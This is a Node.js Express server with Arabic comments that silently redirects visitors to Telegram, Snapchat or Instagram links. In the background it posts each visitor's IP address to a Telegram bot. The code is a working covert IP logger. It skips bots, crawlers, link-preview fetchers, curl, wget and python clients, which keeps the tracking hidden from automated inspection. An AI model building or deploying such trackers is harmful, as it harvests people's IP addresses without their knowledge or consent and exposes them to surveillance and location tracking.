const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// 1. تجاهل وإغلاق طلبات أيقونة الموقع (Favicon) تماماً لمنع التكرار والرسائل العشوائية
app.get('/favicon.ico', (req, res) => res.status(204).end());

// 2. استقبال الطلبات والمسارات بدقة
app.get('/:path*', async (req, res) => {
    const visitorIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const host = req.headers.host || ''; 
    const path = req.path; 

    const telegramUrl = "https://t.me/uUl8iPwh5iYTVk";
    const snapUrl = "https://www.snapchat.com/add/rossan2682";
    const oldInstaUrl = "https://ig.me/j/AbapZ-hZJ16gK_d4/";
    const newInstaChannelUrl = "https://www.instagram.com/channel/AbYsIbwIHyJ3tWZq/";

    let targetUrl = telegramUrl; 
    let destinationName = 'Telegram';

    // التوجيه الذكي بناءً على الرابط المكتوب
    if (path.includes('AbYsIbwIHyJ3tWZq')) {
        targetUrl = newInstaChannelUrl;
        destinationName = 'Instagram Channel';
    } else if (host.includes('instagram') || host.includes('ig')) {
        targetUrl = oldInstaUrl;
        destinationName = 'Instagram';
    } else if (host.includes('snap')) {
        targetUrl = snapUrl;
        destinationName = 'Snapchat';
    }

    // التوجيه الفوري والصامت للزائر
    res.redirect(302, targetUrl);

    // 3. إرسال التنبيه لتليجرام في الخلفية مع تصفية صارمة جداً للبوتات
    try {
        const userAgent = (req.headers['user-agent'] || '').toLowerCase();
        
        // حظر شامل لجميع أنواع البوتات وأدوات الفحص التلقائي
        const isBot = userAgent.includes('bot') || 
                      userAgent.includes('vercel') || 
                      userAgent.includes('spider') || 
                      userAgent.includes('crawl') || 
                      userAgent.includes('facebookexternalhit') || 
                      userAgent.includes('telegrambot') ||
                      userAgent.includes('python') ||
                      userAgent.includes('curl') ||
                      userAgent.includes('wget');

        // التأكد من أنه ليس بوتاً وأن المسار لا يخص أي ملفات تشغيلية
        if (!isBot && !path.includes('favicon')) {
            const token = process.env.TELEGRAM_TOKEN;
            const chatId = process.env.TELEGRAM_CHAT_ID;
            
            if (token && chatId) {
                const message = `🚨 New Visitor!\nTo: ${destinationName}\nIP: ${visitorIp}`;
                
                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                }).catch(() => {});
            }
        }
    } catch (err) {
        console.log("Error: ", err);
    }
});

module.exports = app;
app.listen(PORT);
